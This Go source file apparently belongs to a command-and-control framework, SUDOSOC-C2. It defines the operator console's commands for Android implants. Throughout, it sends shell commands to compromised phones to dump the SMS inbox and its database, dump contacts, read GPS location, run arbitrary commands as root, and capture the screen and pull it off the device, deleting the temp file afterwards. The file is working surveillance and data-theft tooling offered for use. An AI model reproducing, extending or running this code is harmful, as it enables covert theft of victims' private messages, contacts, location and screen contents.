package android

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  sudosoc — Seif

	Android command group for the SUDOSOC-C2 operator console.
	These commands communicate with Android implants running the Phantom engine.

	NOTE: Android-specific RPC methods (AndroidDeviceInfo, AndroidApps, etc.)
	      will be available after running `make pb` to regenerate protobuf stubs.
	      Until then, commands fall back to the generic Execute handler.
*/

import (
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/spf13/cobra"
	"github.com/sudosoc/SUDOSOC-C2/client/console"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
)

// Commands returns the android sub-command group
func Commands(con *console.SudosocClient) []*cobra.Command {
	androidCmd := &cobra.Command{
		Use:   "android",
		Short: "Android device commands (Phantom Mobile Engine)",
		Long:  "Commands for interacting with Android Phantom implants",
		Run: func(cmd *cobra.Command, args []string) {
			_ = cmd.Help()
		},
	}

	// ── Sub-commands ─────────────────────────────────────────────

	infoCmd := &cobra.Command{
		Use:   "info",
		Short: "Device profile: model, Android version, root status",
		Run: func(cmd *cobra.Command, args []string) {
			androidDeviceInfoCmd(cmd, con)
		},
	}

	appsCmd := &cobra.Command{
		Use:   "apps",
		Short: "List installed applications",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con, "pm list packages -f")
		},
	}

	smsCmd := &cobra.Command{
		Use:   "sms",
		Short: "Dump SMS inbox (root required on Android 10+)",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con,
				"content query --uri content://sms/inbox --projection address,body,date 2>/dev/null || "+
					"sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db "+
					"\"SELECT address,body,datetime(date/1000,'unixepoch') FROM sms ORDER BY date DESC LIMIT 200;\"")
		},
	}

	contactsCmd := &cobra.Command{
		Use:   "contacts",
		Short: "Dump device contacts",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con,
				"content query --uri content://contacts/phones --projection display_name,number 2>/dev/null")
		},
	}

	locationCmd := &cobra.Command{
		Use:   "location",
		Short: "Get last known GPS location",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con,
				"dumpsys location | grep -E 'Last Known|lat=|lng=' | head -20")
		},
	}

	wifiCmd := &cobra.Command{
		Use:   "wifi",
		Short: "WiFi interface and connection info",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con,
				"ip addr show wlan0 2>/dev/null; "+
					"getprop wifi.interface 2>/dev/null; "+
					"cat /sys/class/net/wlan0/operstate 2>/dev/null")
		},
	}

	storageCmd := &cobra.Command{
		Use:   "storage",
		Short: "Storage usage (df -h)",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con, "df -h")
		},
	}

	batteryCmd := &cobra.Command{
		Use:   "battery",
		Short: "Battery level, status, and temperature",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con,
				"cat /sys/class/power_supply/battery/capacity 2>/dev/null | xargs -I{} echo 'Level: {}%'; "+
					"cat /sys/class/power_supply/battery/status 2>/dev/null | xargs -I{} echo 'Status: {}'; "+
					"cat /sys/class/power_supply/battery/temp 2>/dev/null | awk '{printf \"Temp: %.1f°C\\n\", $1/10}'")
		},
	}

	rootShellCmd := &cobra.Command{
		Use:   "rootshell [command]",
		Short: "Execute command as root via su (rooted devices only)",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := strings.Join(args, " ")
			androidExecCmd(cmd, con, fmt.Sprintf("su -c '%s'", command))
		},
	}

	screenshotCmd := &cobra.Command{
		Use:   "screenshot",
		Short: "Capture device screen via screencap",
		Run: func(cmd *cobra.Command, args []string) {
			androidScreenshotCmd(cmd, con)
		},
	}
	screenshotCmd.Flags().StringP("save", "s", "", "Save screenshot to local path (PNG)")

	netCmd := &cobra.Command{
		Use:   "netstat",
		Short: "Network connections",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con, "cat /proc/net/tcp6 2>/dev/null; netstat -an 2>/dev/null")
		},
	}

	psCmd := &cobra.Command{
		Use:   "ps",
		Short: "Running processes",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con, "ps -A 2>/dev/null || ps 2>/dev/null")
		},
	}

	rootCheckCmd := &cobra.Command{
		Use:   "rootcheck",
		Short: "Check if device is rooted",
		Run: func(cmd *cobra.Command, args []string) {
			androidExecCmd(cmd, con,
				"which su 2>/dev/null && echo 'su binary found'; "+
					"ls /system/bin/su /system/xbin/su /sbin/su /su/bin/su "+
					"/magisk/.core/bin/su 2>/dev/null; "+
					"su -c id 2>/dev/null && echo 'ROOT CONFIRMED' || echo 'Root not available'")
		},
	}

	androidCmd.AddCommand(
		infoCmd,
		appsCmd,
		smsCmd,
		contactsCmd,
		locationCmd,
		wifiCmd,
		storageCmd,
		batteryCmd,
		rootShellCmd,
		screenshotCmd,
		netCmd,
		psCmd,
		rootCheckCmd,
	)

	return []*cobra.Command{androidCmd}
}

// ════════════════════════════════════════════════════════════════════
// Helpers
// ════════════════════════════════════════════════════════════════════

// androidExecCmd sends a shell command to the Android implant via Execute RPC
func androidExecCmd(cmd *cobra.Command, con *console.SudosocClient, command string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		con.PrintErrorf("No active Android session — use `sessions` to interact with a session first\n")
		return
	}

	req := &sudosocpb.ExecuteReq{
		Path:    "/bin/sh",
		Args:    []string{"-c", command},
		Output:  true,
		Request: con.ActiveTarget.Request(cmd),
	}

	result, err := con.Rpc.Execute(context.Background(), req)
	if err != nil {
		con.PrintErrorf("Execute error: %v\n", err)
		return
	}

	if len(result.Stdout) > 0 {
		con.Printf("%s", string(result.Stdout))
	}
	if len(result.Stderr) > 0 {
		con.PrintWarnf("%s", string(result.Stderr))
	}
}

// androidDeviceInfoCmd collects full device profile
func androidDeviceInfoCmd(cmd *cobra.Command, con *console.SudosocClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		con.PrintErrorf("No active Android session\n")
		return
	}

	script := `
echo "=== Device Profile ==="
echo "Manufacturer: $(getprop ro.product.manufacturer 2>/dev/null)"
echo "Model:        $(getprop ro.product.model 2>/dev/null)"
echo "Brand:        $(getprop ro.product.brand 2>/dev/null)"
echo "Android Ver:  $(getprop ro.build.version.release 2>/dev/null) (SDK $(getprop ro.build.version.sdk 2>/dev/null))"
echo "Build ID:     $(getprop ro.build.id 2>/dev/null)"
echo "Fingerprint:  $(getprop ro.build.fingerprint 2>/dev/null)"
echo "CPU ABI:      $(getprop ro.product.cpu.abi 2>/dev/null)"
echo "Architecture: $(uname -m 2>/dev/null)"
echo "Hostname:     $(hostname 2>/dev/null)"
echo "User:         $(id 2>/dev/null)"
echo ""
echo "=== Root Status ==="
if which su >/dev/null 2>&1; then
  echo "su binary: FOUND"
  if su -c id >/dev/null 2>&1; then
    echo "Root access: YES (ROOTED)"
  else
    echo "Root access: su present but not executable"
  fi
else
  echo "Root access: NO"
fi
echo ""
echo "=== Network ==="
ip addr show 2>/dev/null | grep -E "inet |wlan|eth|rmnet" | head -10
echo ""
echo "=== Storage ==="
df -h 2>/dev/null | head -8
`

	req := &sudosocpb.ExecuteReq{
		Path:    "/bin/sh",
		Args:    []string{"-c", script},
		Output:  true,
		Request: con.ActiveTarget.Request(cmd),
	}

	result, err := con.Rpc.Execute(context.Background(), req)
	if err != nil {
		con.PrintErrorf("Execute error: %v\n", err)
		return
	}

	con.Printf("\n%s\n", string(result.Stdout))
}

// androidScreenshotCmd captures the screen using screencap
func androidScreenshotCmd(cmd *cobra.Command, con *console.SudosocClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		con.PrintErrorf("No active Android session\n")
		return
	}

	savePath, _ := cmd.Flags().GetString("save")
	if savePath == "" {
		savePath = "android_screenshot.png"
	}

	tmpPath := "/data/local/tmp/sudosoc_sc.png"

	// Take screenshot on device
	req := &sudosocpb.ExecuteReq{
		Path:    "/bin/sh",
		Args:    []string{"-c", fmt.Sprintf("screencap -p %s && echo OK", tmpPath)},
		Output:  true,
		Request: con.ActiveTarget.Request(cmd),
	}
	res, err := con.Rpc.Execute(context.Background(), req)
	if err != nil || !strings.Contains(string(res.Stdout), "OK") {
		con.PrintErrorf("screencap failed: %v\n%s\n", err, res.Stderr)
		return
	}

	// Download the screenshot
	dlReq := &sudosocpb.DownloadReq{
		Path:    tmpPath,
		Request: con.ActiveTarget.Request(cmd),
	}
	dlResult, err := con.Rpc.Download(context.Background(), dlReq)
	if err != nil {
		con.PrintErrorf("Download failed: %v\n", err)
		return
	}

	if err := os.WriteFile(savePath, dlResult.Data, 0644); err != nil {
		con.PrintErrorf("Save failed: %v\n", err)
		return
	}

	// Cleanup temp file on device
	cleanReq := &sudosocpb.ExecuteReq{
		Path:    "/bin/sh",
		Args:    []string{"-c", fmt.Sprintf("rm -f %s", tmpPath)},
		Output:  false,
		Request: con.ActiveTarget.Request(cmd),
	}
	_, _ = con.Rpc.Execute(context.Background(), cleanReq)

	con.Printf("[*] Screenshot saved → %s (%.1f KB)\n",
		savePath, float64(len(dlResult.Data))/1024)
}
